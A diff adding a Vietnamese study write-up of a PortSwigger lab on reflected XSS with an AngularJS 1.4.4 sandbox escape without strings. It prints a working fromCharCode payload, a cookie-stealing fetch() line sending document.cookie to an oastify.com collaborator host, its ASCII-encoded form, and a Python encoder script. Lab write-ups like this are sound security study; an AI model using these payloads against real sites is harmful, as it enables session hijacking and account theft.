@@ -574,7 +574,67 @@ Sử dùng back stick để đóng gói url
 ![alt text](image-45.png)
 
 
-- [ ] **5/5** — Reflected XSS with AngularJS sandbox escape without strings
+### Reflected XSS with AngularJS sandbox escape without strings
+
+Lab này xây dựng trong môi trường AngularJS 1.4.4
+
+Khi mà `eval` không còn tác dụng XSS đối với AngularJS 1.4.4
+
+![alt text](image-47.png)
+
+Điểm đặc biệt khi xử lí biến `search`
+
+![alt text](image-48.png)
+
+Test bằng việc thêm 1 key nữa và giá trị render không còn là giá trị search 
+
+![alt text](image-49.png)
+
+Check bằng `7*7` để xem nó có thực thi không
+
+Tuy nhiên khi thay payload chưa eval thì không được 
+
+Đây là payload thay thế 
+
+```code
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+
+Các dãy số `120,61,97,108,101,114,116,40,49,41` đại diện cho kí tự ASCII : `x=alert(1)`
+
+[Và để cướp cookie dùng payload sau](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings))
+
+```code
+x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)
+```
+
+Tương ứng với 
+
+```code
+120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
+```
+
+Dùng đoạn code sau để chuyển đối text sang ASCII
+
+```code
+import sys
+
+print('Python String to ASCII Converter!')
+if len(sys.argv) != 2:
+    print("Usage: Python ascii_converter.py 'Payload_String'")
+    sys.exit(1)
+
+input_string = sys.argv[1]
+ascii_values = [str(ord(char)) for char in input_string]
+
+output = ",".join(ascii_values)
+print(output)
+print('PortSwigger Expert Academy Labs!')
+```
+![alt text](image-50.png)
+
+
+
 - [ ] **6/5** — Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 - [ ] **7/5** — Practice Exam Stage 1 — XSS via JSON into EVAL
 - [ ] **8/5** — Exploiting cross-site scripting to steal cookies (Stored XSS)
